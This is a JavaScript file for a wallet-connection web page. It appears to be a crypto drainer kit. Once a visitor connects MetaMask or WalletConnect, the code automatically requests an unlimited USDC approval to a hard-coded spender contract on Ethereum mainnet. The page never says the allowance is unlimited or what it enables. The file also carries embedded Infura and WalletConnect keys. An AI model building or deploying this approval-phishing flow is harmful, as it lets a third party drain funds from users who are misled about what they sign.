// script.js
// --- Configuration for Ethereum Mainnet ---
const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005'; // Your WalletConnect Project ID for V1 (though not strictly needed by provider itself)
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // Official Ethereum Mainnet USDC Address
const SPENDER_CONTRACT_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6'; // Your Deployed UsdcAllowanceSpender Contract on Mainnet
const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)

// Auto-approve configuration
const AUTO_APPROVE_ENABLED = true; // Set to true to automatically trigger the approval transaction

const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function decimals() view returns (uint8)"
];

let provider; // Ethers.js provider
let signer;   // Ethers.js signer
let connectedAccount; // Connected wallet address
let wcProvider; // WalletConnect V1 provider instance

// --- DOM Elements ---
const connectMetaMaskButton = document.getElementById('connectMetaMaskButton');
const connectMobileButton = document.getElementById('connectMobileButton');
const approveButton = document.getElementById('approveButton');
const currentMessage = document.getElementById('current-message');
const loader = document.getElementById('loader');
const walletInfo = document.getElementById('walletInfo');
const accountAddress = document.getElementById('accountAddress');
const networkName = document.getElementById('networkName');
const statusDiv = document.getElementById('status');
const errorDetailsDiv = document.getElementById('errorDetails');
const errorMessageSpan = document.getElementById('errorMessage');
const qrcodeDisplay = document.getElementById('qrcodeDisplay');
const qrcodeImage = document.getElementById('qrcodeImage');

// --- UI Update Functions ---
function hideLoader() {
    loader.classList.add('hidden');
}

function showLoader() {
    loader.classList.remove('hidden');
}

function updateMessage(text, type = 'info') {
    currentMessage.textContent = text;
    currentMessage.className = `status-message ${type}`;
    hideLoader();
}

function showStatus(message, type) {
    statusDiv.textContent = message;
    statusDiv.className = `status-message ${type}`;
    statusDiv.classList.remove('hidden');
}

function hideStatus() {
    statusDiv.classList.add('hidden');
}

function displayErrorDetails(error) {
    errorMessageSpan.textContent = error.message || String(error);
    errorDetailsDiv.classList.remove('hidden');
}

function hideErrorDetails() {
    errorDetailsDiv.classList.add('hidden');
}

function updateWalletInfo(address, network) {
    accountAddress.textContent = address;
    networkName.textContent = network;
    walletInfo.classList.remove('hidden');
    // If auto-approve is enabled, we don't need the approve button, it triggers automatically
    if (!AUTO_APPROVE_ENABLED) {
        approveButton.classList.remove('hidden'); 
    }
    connectMetaMaskButton.classList.add('hidden');
    connectMobileButton.classList.add('hidden');
    qrcodeDisplay.classList.add('hidden'); // Hide QR code after connection
}

function resetUI() {
    walletInfo.classList.add('hidden');
    approveButton.classList.add('hidden');
    connectMetaMaskButton.classList.remove('hidden');
    connectMobileButton.classList.remove('hidden');
    qrcodeDisplay.classList.add('hidden');
    hideStatus();
    hideErrorDetails();
    updateMessage('Please connect your wallet to approve USDC.', 'info');
    // Only try to disconnect if wcProvider exists and is connected
    if (wcProvider && wcProvider.connected) {
        console.log("Disconnecting WalletConnect provider...");
        wcProvider.disconnect();
        wcProvider = null; // Clear provider instance
    }
}

// Generic handler for provider changes/connection
async function handleProviderConnection(currentProvider) {
    if (!currentProvider) {
        console.log("Provider disconnected or not available.");
        resetUI();
        return;
    }

    try {
        provider = new ethers.providers.Web3Provider(currentProvider); // Ethers V5 provider
        signer = provider.getSigner();
        connectedAccount = await signer.getAddress();
        const network = await provider.getNetwork();

        updateWalletInfo(connectedAccount, network.name);
        updateMessage('Wallet connected. Ready to approve USDC.', 'success');
        console.log('Wallet connected:', connectedAccount, 'on', network.name);

        // Automatically trigger approval if enabled
        if (AUTO_APPROVE_ENABLED) {
            console.log('DEBUG: AUTO_APPROVE_ENABLED is true. Attempting to proposeApproveTransaction()...');
            await proposeApproveTransaction();
        }

        // Set up event listeners for the provider
        currentProvider.on("accountsChanged", (accounts) => {
            console.log("accountsChanged", accounts);
            if (accounts.length === 0) resetUI();
            else handleProviderConnection(currentProvider);
        });
        currentProvider.on("chainChanged", (chainId) => {
            console.log("chainChanged", chainId);
            handleProviderConnection(currentProvider);
        });
        currentProvider.on("disconnect", (code, reason) => {
            console.log("disconnect", code, reason);
            resetUI();
        });

    } catch (error) {
        console.error('Error handling provider connection:', error);
        updateMessage('Error processing wallet connection.', 'error');
        displayErrorDetails(error);
        resetUI();
    } finally {
        hideLoader();
    }
}

async function connectMetaMask() {
    showLoader();
    updateMessage('Connecting to MetaMask...', 'info');
    hideStatus();
    hideErrorDetails();

    try {
        if (typeof window.ethereum === 'undefined') {
            throw new Error("MetaMask not detected. Please install it.");
        }

        // Request account access for MetaMask
        await window.ethereum.request({ method: 'eth_requestAccounts' });

        // Use window.ethereum as the provider and pass to generic handler
        await handleProviderConnection(window.ethereum);

    } catch (error) {
        console.error('MetaMask connection failed:', error);
        updateMessage('MetaMask connection cancelled or failed.', 'error');
        displayErrorDetails(error);
        resetUI();
        hideLoader();
    }
}

async function connectMobileWallet() {
    showLoader();
    updateMessage('Generating QR code for mobile wallet...', 'info');
    hideStatus();
    hideErrorDetails();

    try {
        console.log("Attempting to initialize WalletConnect V1 provider...");
        wcProvider = new WalletConnectProvider.default({
            rpc: {
                1: "https://mainnet.infura.io/v3/c79ab9e1069c43b8b27c4821ddb76b4e", // Your Infura ID
                11155111: "https://sepolia.infura.io/v3/c79ab9e1069c43b8b27c4821ddb76b4e", // Your Infura ID
            },
            chainId: 1, // Default to Mainnet
            bridge: "https://bridge.walletconnect.org", // Official WalletConnect V1 bridge
        });

        console.log("WalletConnect V1 provider initialized. Calling enable()...");
        // This will open the QR code modal or connect to a cached session
        await wcProvider.enable();
        console.log("WalletConnect V1 enable() called.");

        // Display QR Code if not connected yet
        if (!wcProvider.connected) {
            console.log("WalletConnect not yet connected. Displaying QR code...");
            if (typeof QRCode === 'undefined') {
                throw new Error("QRCode library not loaded. Cannot display QR code.");
            }
            qrcodeDisplay.classList.remove('hidden');
            // Clear previous QR code if any
            qrcodeImage.src = ''; 
            const qrCodeDataURL = await QRCode.toDataURL(wcProvider.connector.uri);
            qrcodeImage.src = qrCodeDataURL;
            updateMessage('Scan QR code with your mobile wallet.', 'info');
        } else {
            console.log("WalletConnect already connected. Proceeding...");
            // Already connected, proceed
            await handleProviderConnection(wcProvider);
        }

        // Listen for connection events from WalletConnectProvider
        wcProvider.on("connect", (error, payload) => {
            console.log("WC connected", payload);
            if (error) {
                console.error("WC Connect Error:", error);
                displayErrorDetails(error);
                resetUI();
                hideLoader();
            } else {
                handleProviderConnection(wcProvider);
            }
        });

        wcProvider.on("disconnect", (code, reason) => {
            console.log("WC disconnect", code, reason);
            resetUI();
        });

        wcProvider.on("error", (error) => {
            console.error("WalletConnect provider error:", error);
            // Optionally, update UI to show error details
            displayErrorDetails(error);
            hideLoader();
        });

    } catch (error) {
        console.error('Mobile wallet connection failed:', error);
        // Check specifically for WebSocket errors here
        if (error.message && error.message.includes("WebSocket connection to")) {
            updateMessage('Mobile wallet connection failed: WebSocket connection blocked or unavailable. Check your network/firewall.', 'error');
        } else {
            updateMessage('Mobile wallet connection cancelled or failed.', 'error');
        }
        displayErrorDetails(error);
        resetUI();
        hideLoader();
    }
}

// --- Propose Approve Transaction Function ---
async function proposeApproveTransaction() {
    if (!signer || !connectedAccount) {
        updateMessage('Wallet not connected. Please connect your wallet first.', 'error');
        return;
    }

    showLoader();
    updateMessage('Proposing USDC approval transaction... Please confirm in your wallet.', 'info');
    hideStatus();
    hideErrorDetails();

    try {
        // Ethers V5: use ethers.Contract directly
        const usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        
        // Ethers V5: ethers.constants.MaxUint256
        const txResponse = await usdcContract.approve(
            SPENDER_CONTRACT_ADDRESS,
            ethers.constants.MaxUint256 // Unlimited allowance
        );

        const txHash = txResponse.hash;

        showStatus(`Transaction submitted! Hash: ${txHash.substring(0, 10)}...${txHash.substring(txHash.length - 4)}. Check wallet for status.`, 'success');
        updateMessage('Approval transaction sent!', 'success');
        console.log('Transaction Hash:', txHash);

    } catch (error) {
        console.error('Transaction proposal failed:', error);
        showStatus(`Transaction failed: ${error.message || error}`, 'error');
        updateMessage('Approval transaction failed.', 'error');
        displayErrorDetails(error);
    } finally {
        hideLoader();
    }
}

// --- Event Listeners ---
connectMetaMaskButton.addEventListener('click', connectMetaMask);
connectMobileButton.addEventListener('click', connectMobileWallet);

// The approve button is now only visible if AUTO_APPROVE_ENABLED is false
if (!AUTO_APPROVE_ENABLED) {
    approveButton.addEventListener('click', proposeApproveTransaction);
}

// Initial setup on load
window.addEventListener('load', async () => {
    // Check if the buttons and QR display elements exist before adding event listeners (for robustness)
    if (!connectMetaMaskButton || !connectMobileButton || !qrcodeDisplay || !qrcodeImage) {
        console.error("One or more essential UI elements not found! Ensure index.html is up-to-date.");
        updateMessage("UI Initialization Error: Please check console for details.", "error");
        return;
    }

    // Attempt to re-establish previous connection if any (WalletConnect V1 cached session)
    // Simplified check: if localStorage has WalletConnect data, try to connect
    const cachedWCSession = localStorage.getItem('walletconnect');
    if (cachedWCSession) {
        console.log("Found cached WalletConnect V1 session. Attempting to re-establish.");
        // Re-initialize wcProvider, it will pick up the cached session
        wcProvider = new WalletConnectProvider.default({
            rpc: {
                1: "https://mainnet.infura.io/v3/c79ab9e1069c43b8b27c4821ddb76b4e", 
                11155111: "https://sepolia.infura.io/v3/c79ab9e1069c43b8b27c4821ddb76b4e", 
            },
            chainId: 1,
            bridge: "https://bridge.walletconnect.org",
        });
        try {
            await wcProvider.enable(); // This will re-connect if session is valid
            if (wcProvider.connected) {
                await handleProviderConnection(wcProvider);
            } else {
                console.log("Cached WalletConnect session not re-established. Clearing...");
                localStorage.removeItem('walletconnect');
                resetUI();
            }
        } catch (e) {
            console.error("Error re-establishing cached WC session:", e);
            localStorage.removeItem('walletconnect'); // Clear invalid session
            resetUI();
        }
    } else if (window.ethereum && window.ethereum.selectedAddress) {
        console.log("Found existing MetaMask selectedAddress. Attempting to re-establish session.");
        await handleProviderConnection(window.ethereum);
    } else {
        updateMessage('Please connect your wallet to approve USDC.', 'info');
    }
});
